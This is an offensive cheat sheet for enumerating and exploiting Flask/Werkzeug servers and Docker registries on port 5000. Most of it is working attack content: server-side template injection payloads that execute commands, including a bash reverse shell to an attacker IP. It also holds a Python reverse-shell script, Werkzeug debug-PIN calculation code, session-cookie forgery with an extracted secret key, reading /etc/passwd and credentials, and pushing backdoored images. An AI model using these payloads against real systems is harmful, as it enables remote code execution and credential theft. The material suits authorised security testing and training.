# FLASK / DOCKER REGISTRY ENUMERATION (Port 5000)

## SERVICE OVERVIEW
```
Port 5000 is commonly used for:
- Flask development server (Python web framework)
- Docker Registry (container image registry)
- UPnP (Universal Plug and Play)
- Various development/testing servers
- Windows-specific services (SSDP)
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p5000 <IP>                             # Service/Version detection
curl -I http://<IP>:5000                         # HTTP headers
curl http://<IP>:5000 | grep -i "flask\|docker\|registry"
nc -nv <IP> 5000                                 # Manual connection
```

## SERVICE DETECTION
```bash
# Detect what's running
whatweb http://<IP>:5000 -a 3                    # Aggressive fingerprinting
curl -I http://<IP>:5000 | grep -i "server\|x-powered"

# Common services on port 5000:
# - Flask (Werkzeug development server)
# - Docker Registry v2
# - UPnP devices
# - Development web servers
```

## FLASK DETECTION & EXPLOITATION
```bash
# Detect Flask/Werkzeug
curl -I http://<IP>:5000 | grep -i "werkzeug\|flask"
curl http://<IP>:5000 | grep -i "werkzeug"

# Flask debug mode detection (CRITICAL!)
curl http://<IP>:5000/nonexistent
# Look for Werkzeug debugger in response

# If debug mode enabled:
# - Full Python console access
# - Can execute arbitrary code!
```

## FLASK DEBUG MODE EXPLOITATION
```bash
# Flask debug mode = Python RCE!

# Access debug console
curl http://<IP>:5000/console

# The debug PIN is required, but can be calculated/brute forced

# Werkzeug debug PIN exploitation
# PIN is generated from:
# - Machine ID
# - MAC address
# - Path to flask app

# Calculate PIN (if you have LFI or info disclosure):
git clone https://github.com/wdahlenburg/werkzeug-debug-console-bypass
python werkzeug-pin.py

# Or use automated tool
python werkzeug_rce.py http://<IP>:5000
```

## FLASK SSTI (SERVER-SIDE TEMPLATE INJECTION)
```bash
# Test for SSTI in Flask/Jinja2
curl "http://<IP>:5000/?name={{7*7}}"            # Returns 49 if vulnerable
curl "http://<IP>:5000/?name={{config}}"         # Dump Flask config
curl "http://<IP>:5000/?name={{request}}"        # Request object

# RCE via SSTI
curl "http://<IP>:5000/?name={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"

# Python reverse shell via SSTI
{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1"').read()}}

# Alternative SSTI payloads
{{''.__class__.__mro__[1].__subclasses__()[414]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.items()}}
```

## DOCKER REGISTRY DETECTION
```bash
# Detect Docker Registry
curl http://<IP>:5000/v2/                        # Docker Registry v2 API

# If Docker Registry:
# Response: {"errors":[...]} or authentication required

# Check version
curl http://<IP>:5000/v2/ -I | grep -i "docker"
```

## DOCKER REGISTRY ENUMERATION
```bash
# List repositories (images)
curl http://<IP>:5000/v2/_catalog

# List tags for specific repository
curl http://<IP>:5000/v2/<repository>/tags/list

# Example:
curl http://<IP>:5000/v2/_catalog
# {"repositories":["app","nginx","mysql"]}

curl http://<IP>:5000/v2/app/tags/list
# {"name":"app","tags":["latest","v1.0","dev"]}

# Get manifest
curl http://<IP>:5000/v2/app/manifests/latest
```

## DOCKER REGISTRY EXPLOITATION
```bash
# Download Docker image
docker pull <IP>:5000/app:latest

# Or manually download layers
curl http://<IP>:5000/v2/app/manifests/latest > manifest.json
# Extract layer digests from manifest
curl http://<IP>:5000/v2/app/blobs/<digest> -o layer.tar.gz

# Extract and analyze image
docker save <IP>:5000/app:latest -o app.tar
tar -xvf app.tar

# Look for:
# - Credentials in environment variables
# - SSH keys
# - Application source code
# - Configuration files
# - Database credentials
```

## DOCKER REGISTRY UPLOAD (If Writable)
```bash
# Push malicious image (if registry allows)
docker tag malicious:latest <IP>:5000/backdoor:latest
docker push <IP>:5000/backdoor:latest

# Image with backdoor
docker run -it <IP>:5000/backdoor:latest /bin/bash
```

## UPNP DETECTION (If UPnP Service)
```bash
# UPnP discovery
nmap -sU -p5000 --script upnp-info <IP>

# SSDP (Simple Service Discovery Protocol)
echo -ne "M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:ssdp:all\r\nMan:\"ssdp:discover\"\r\nMX:3\r\n\r\n" | nc -u <IP> 5000
```

## DIRECTORY ENUMERATION
```bash
# Directory brute forcing
gobuster dir -u http://<IP>:5000 -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://<IP>:5000/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Common Flask paths
/admin
/api
/debug
/console                                         # Werkzeug debugger!
/static
/upload
/_debug_toolbar                                  # Flask Debug Toolbar
```

## FLASK SECRET KEY EXTRACTION
```bash
# If SSTI or debug mode, extract Flask secret key
{{config.items()}}
{{config['SECRET_KEY']}}

# Secret key allows:
# - Session cookie forgery
# - CSRF token bypass
# - Privilege escalation

# Forge session cookie with secret key
flask-unsign --sign --cookie "{'user_id': 1, 'is_admin': True}" --secret 'extracted_secret_key'
```

## COMMON MISCONFIGURATIONS
```
☐ Flask debug mode enabled in production         # Python RCE!
☐ Werkzeug debugger accessible                   # Code execution
☐ SSTI vulnerability                             # Template injection
☐ Docker Registry without authentication          # Image theft
☐ Secret key in source code                     # Session forgery
☐ Exposed source code/config files              # Information disclosure
☐ No rate limiting                               # Brute force possible
☐ CORS misconfiguration                          # XSS/CSRF
```

## VULNERABILITY SCANNING
```bash
# Nikto scan
nikto -h http://<IP>:5000

# Nmap scripts
nmap -p5000 --script http-enum <IP>
nmap -p5000 --script http-vuln-* <IP>

# Search for vulnerabilities
searchsploit flask
searchsploit werkzeug
searchsploit "docker registry"
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/http/dir_scanner           # Directory scanner
use auxiliary/scanner/http/docker_registry       # Docker Registry scanner (if exists)
set RHOSTS <IP>
set RPORT 5000
run
```

## QUICK WIN CHECKLIST
```
☐ Check for Flask/Werkzeug in headers
☐ Test for debug mode (/console, /nonexistent)
☐ Test for SSTI ({{7*7}})
☐ Check for Docker Registry (/v2/)
☐ Enumerate Docker images
☐ Download and analyze Docker images
☐ Extract Flask secret key
☐ Look for exposed config files
☐ Test for authentication bypass
☐ Check for known CVEs
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive scan
nmap -sV -p5000 --script "http-*" -oA port_5000_enum <IP>

# Quick Flask debug check
curl -s http://<IP>:5000/nonexistent | grep -i "werkzeug\|traceback"

# Quick Docker Registry check
curl -s http://<IP>:5000/v2/_catalog
```

## POST-EXPLOITATION
```bash
# After Flask RCE (via debug mode or SSTI)

# 1. Reverse shell
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<attacker_IP>",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])

# 2. Read sensitive files
import os
os.popen('cat /etc/passwd').read()
os.popen('cat app/config.py').read()

# 3. Extract database credentials
import app
print(app.config['SQLALCHEMY_DATABASE_URI'])

# After Docker Registry access:

# 1. Download all images
for repo in $(curl -s http://<IP>:5000/v2/_catalog | jq -r '.repositories[]'); do
    docker pull <IP>:5000/$repo
done

# 2. Extract secrets from images
docker inspect <IP>:5000/app:latest
docker history <IP>:5000/app:latest

# 3. Look for credentials
docker run --rm <IP>:5000/app:latest env
docker run --rm <IP>:5000/app:latest cat /app/config.py
```

## FLASK CONFIGURATION FILES
```bash
# Common Flask file locations
app.py                                           # Main application
config.py                                        # Configuration
requirements.txt                                 # Dependencies
.env                                             # Environment variables
instance/config.py                               # Instance config
wsgi.py                                          # WSGI entry point
```

## SECURITY IMPLICATIONS
```
CRITICAL RISKS - FLASK:
1. Debug mode = immediate Python RCE
2. SSTI = code execution
3. Secret key exposure = session forgery
4. Often runs as root/with high privileges
5. Source code exposure
6. Database credentials in config
7. No authentication in development

CRITICAL RISKS - DOCKER REGISTRY:
1. Unauthenticated access to all images
2. Images contain secrets/credentials
3. Application source code in images
4. Can push malicious images (if writable)
5. Reveals infrastructure/tech stack
6. SSH keys in images
7. Database dumps in layers

RECOMMENDATION:
- NEVER run Flask in debug mode in production
- Use environment variables for secrets
- Implement authentication on Docker Registry
- Don't expose development servers
- Use production WSGI server (gunicorn, uwsgi)
- Scan Docker images for secrets
- Regular security audits
```

## WERKZEUG PIN BYPASS TECHNIQUES
```python
# If you have LFI or can read files, calculate Werkzeug PIN

# Files needed:
# 1. /proc/sys/kernel/random/boot_id or /sys/class/net/<device>/address
# 2. /proc/self/cgroup (for container ID)
# 3. Flask app path

# Calculate PIN:
import hashlib
from itertools import chain

probably_public_bits = [
    'username',  # getpass.getuser()
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', app.__class__.__name__)
    '/usr/local/lib/python3.8/site-packages/flask/app.py'  # app path
]

private_bits = [
    '2485377581186',  # str(uuid.getnode()) - MAC address as decimal
    'b7b8a0a4-5c2d-4c90-9c0a-f6e5c6d8e9f0'  # boot_id or machine-id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

num = f'{int(h.hexdigest(), 16):09d}'[:9]

# Format PIN: xxx-xxx-xxx
pin = f'{num[:3]}-{num[3:6]}-{num[6:]}'
print(f'PIN: {pin}')
```
